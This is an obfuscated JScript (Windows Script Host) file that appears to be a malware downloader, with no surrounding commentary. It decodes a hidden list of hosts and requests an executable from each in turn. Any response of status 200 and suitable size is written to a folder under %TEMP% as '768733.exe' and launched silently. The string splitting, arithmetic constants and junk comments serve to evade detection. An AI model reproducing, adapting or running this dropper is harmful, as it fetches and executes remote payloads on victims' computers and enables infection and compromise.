

function LzwDDcPJT(FxvDUgnIWwc) {
var iJTFlvXY = WScript.CreateObject("Wscript.Shell");
iJTFlvXY.Run(FxvDUgnIWwc, 0x1, 0x0);
}
function ziRbzxCNX(GSSbY,getfl,hOMyj) {
var lgeNk = "DDciIT GeF pt.Shell CZpFbUX Scri".split(" ");
var cJH=((1)?"W" + lgeNk[4]:"")+lgeNk[2];
var st = WScript.CreateObject(cJH);
var nr = "%TEMP%\\";
return st.ExpandEnvironmentStrings(nr);
}
function udaMnUEw() {
var NdjyPwG = "ipting";
var CkxtszosqR = "ile";
var DIEiK = "System";
return "Sc" + "r" + NdjyPwG + ".F" + CkxtszosqR + DIEiK + "Obj" + "ect";
}
function UDdR(HMUFX) {
return WScript.CreateObject(HMUFX);
}
function hnXm(GaHFk,AYTJW) {
GaHFk.write(AYTJW);
}
function baeb(GvoAf) {
GvoAf.open();
}
function zVnc(adyNt,XULDF) {
adyNt.saveToFile(XULDF,269-267);
}
function ycXA(gRqDw,DMBRz,BESmJ) {
gRqDw.open(BESmJ,DMBRz,false);
}
function Mirr(WmZBD) {
if (WmZBD == 967-767){return true;} else {return false;}
}
function UYKv(QOuvp) {
if (QOuvp > 155490-442){return true;} else {return false;}
}
function Vzqm(zuUPh) {
var JIvmv="";
for(x=(429-429); x < zuUPh.length; x++)
if (x % (723-721) != (102-102)) {
JIvmv += zuUPh.substr(x, 967-966);
}
return JIvmv;
}
function YvLo(BBYGE) {
BBYGE.send();
}
function bVvh(PofMs) {
return PofMs.status;
}
function fYxNu(jlSpvF) {
return new ActiveXObject(jlSpvF);
}
var wK="xo5hgeYlalBouwurhuff7fv.ncSoomk 7/P840o.uerxQeM?M bteh7iTslifswictvsoqqq3.5cnoQmD/P8g00.3erx0eT?D O?W x?E j?";
var f = Vzqm(wK).split(" ");
var gEy = ziRbzxCNX("zhmb","aGOds","oWNzoz");
var YRs = fYxNu(udaMnUEw());
var IOuZ = gEy+"jSgMeOX\\";
try{
YRs.CreateFolder(IOuZ);
}catch(EWZqQz){
};
var yDe = "2.XMLH";
var sEN = (yDe + "TTP" + " ZgmscWI XsIGe XML ream St evAtIIYO AD QQKczUw OD").split(" ");
var pn = true  , ZNNC = sEN[7] + "" + sEN[9];
var rB = UDdR("MS"+sEN[3]+(599931, sEN[0]));
var WZK = UDdR(ZNNC + "B." + sEN[5]+(778899, sEN[4]));
var Owu = 0;
var e = 1;
var BjLZPYe = 768733;
var c=Owu;
while (true)  {
if(c>=f.length) {break;}
var tB = 0;
var nEZ = ("ht" + " gLJCjKn tp KmUZN YPbKNisC :// mcijTFe .e xe G ET").split(" ");
try  {
ycXA(rB,nEZ[0]+nEZ[2]+nEZ[5]+f[c]+e, nEZ[9]+nEZ[10]); YvLo(rB); if (Mirr(bVvh(rB)))  {      
baeb(WZK); WZK.type = 1; hnXm(WZK,rB.responseBody); if (UYKv(WZK.size))  {
tB = 1; WZK.position = 0; zVnc(WZK,/*4XK950yczO*/IOuZ/*kHk746PhiG*/+BjLZPYe+nEZ[7]+nEZ[8]); try  {
if (((new Date())>0,7113722888)) {
LzwDDcPJT(IOuZ+BjLZPYe+/*R0jo34cAt4*/nEZ[7]+nEZ[8]/*PawW77BDsi*/); 
break;
}
}
catch (uc)  {
}; 
}; WZK.close(); 
}; 
if (tB == 1)  {
Owu = c; break; 
}; 
}
catch (uc)  { 
}; 
c++;
}; 

